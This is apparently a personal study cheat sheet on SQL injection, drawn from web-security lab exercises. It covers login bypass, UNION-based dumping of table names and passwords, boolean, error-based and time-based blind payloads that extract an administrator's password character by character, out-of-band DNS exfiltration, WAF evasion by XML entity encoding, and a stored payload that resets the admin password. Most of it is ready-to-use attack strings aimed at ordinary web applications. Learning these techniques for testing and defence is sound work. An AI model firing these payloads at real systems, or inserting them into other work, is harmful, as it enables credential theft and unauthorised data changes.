## SQL injection 
- SQLi vulnerabilities can allow an attacker to modify or delete data, compromise the underlying server or even perform `denial of service` attacks.

### Detection
- `'`, `OR 1=1`, `OR 1=2`, `time based payloads`, `OAST payloads`

### Common injection points
- SELECT * from Where **SQLi**
- UPDATE set x=1 where **SQLi**
- INSERT into x values (**SQLi**)
- SELECT **SQLi** from **SQLi** ORDER BY **SQLi**

- Ways to exploit login: username: `admin'--` or password=`pass'+OR+1=1--`

### SQL injection UNION attacks
- `EMBER MULTIPLE SELECT STATEMENTS`
-  **EX: SELECT A,B, FROM TABLE1 UNION SELECT C,D FROM TABLE2**
- This needs `same nr of columns`, and `compatible types of columns`
- STEPS: 
    - determine nr of columns 
        - `ORDER BY n` until it fails
        - `UNION SELECT NULL, NULL, NULL....(FROM DUAL -- FOR ORACLE)`until it succeeds and adds a null column
    - determine the types
        - `UNION SELECT 'a', NULL, NULL....(FROM DUAL -- FOR ORACLE)`until it succeeds and adds a null column
- `COMBINE MULTIPLE COLUMNS` : `SELECT USERNAME || '-' || PASSWORD FROM TABLE`(IN ORACLE)

- ### How to inspect the database tables and properties
    - `SELECT @@VERSION`**MYSQL**, `SELECT * FROM v$version` **ORACLE**, `SELECT version()` **PostgreSQL**
    - `SELECT * FROM information_schema.tables` or `.columns`
    - ex STEP1: category=Gifts' UNION SELECT table_name,NULL from information_schema.tables
    - ex STEP2: category=Gifts' UNION SELECT column_name,NULL from information_schema.columns where table_name='TABLENAME FOUND AT STEP 1'
    - ex STEP3: category=Gifts' UNION SELECT column1,column2 from 'TABLENAME FOUND AT STEP 1' -> to get the data

### Blind SQL injections
- `Cookies like TrackingId=jhkahkjdlsahlda9`can also be an injection point!
- Analyse the difference in behaviour for `'AND'1'='1` and for `'AND'1'='2` (ex: Welcome back message!)
- DETERMINE DATA ONE STEP AT A TIME
        - use `SUBSTRING(data, start, length)` for this
        - ex: `TrackingId=t5gh9WYA3E8wgTlF'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='§a§`


### Error-based SQL injection (BLIND)
- In case boolean SQLi doesn't have an indication of success visible in the application response, you turn to Error-based SQL injection and hope that unhandeld SQL errors will cause a difference in the response.
- Induce an error as an indication of success, or have the data returned into error messages -> visible SQLi.
- TEST PAYLOAD: `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a`
- EXPLOIT PAYLOAD: `xyz' AND (SELECT CASE WHEN (username='admin' and substring(password, 1, 1)='a') THEN 1/0 ELSE 'a' END) = 'a`
- **Verbose error messages**:
    - CAST() to int to force a select result to generate an error with the output of the select.
    - `CAST((SELECT example_column FROM example_table) AS int)` -> `ERROR: invalid input syntax for type integer: "Example data"`
    - PAYLOAD: `TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--`
- **Time based BLIND SQL injection**
    - if errors are handled in code, then your next idea is time based
    - These happen if the SQL is handles sinchrounously and if you add a delay in the sql query it should DELAY also the HTTP response (**inefficient if done async**)
    - PAYLOAD: `'%3b(SELECT CASE WHEN ((SELECT SUBSTRING(password,{i},1) from users where username='administrator')='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--`

### Blind SQL Out-of-band techinque(OAST)
- What if the SQL query is handled `asynchronously`? Then no more time based attacks...
- You need to trigger `OUT OF BAND interactions` to a system that you control.(DNS lookups)
- `Use Burp Collaborator for this!`
- If you identify that a DNS lookup happened to your domain, then you can append to the url the output of any query directly and you get them in the DNS query.

### XML encoded SQLi 
- You can encode your payload in any format: JSON, XML
- Sometimes there is a `WAF` to bypass -> you can use Hackvertor from BurpSUite extensions, and wrap your payload in a xml tag to bypass it
- ex: `
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>
1 
</productId><storeId><@dec_entities>1 UNION SELECT username||'+'||password from users LIMIT 5<@/dec_entities></storeId></stockCheck>`
- The `<@dec_entities>` tag is used to encode the sqli payload like this behind the scenes: 

    </productId><storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#43;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#102;&#114;&#111;&#109;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#76;&#73;&#77;&#73;&#84;&#32;&#53;</storeId></stockCheck>

## Second order SQL injections = STORED SQli
- ex: create a username like: `badguy';update users set password='letmein' where user='administrator'` -> trigger the SQLi in a later HTTP request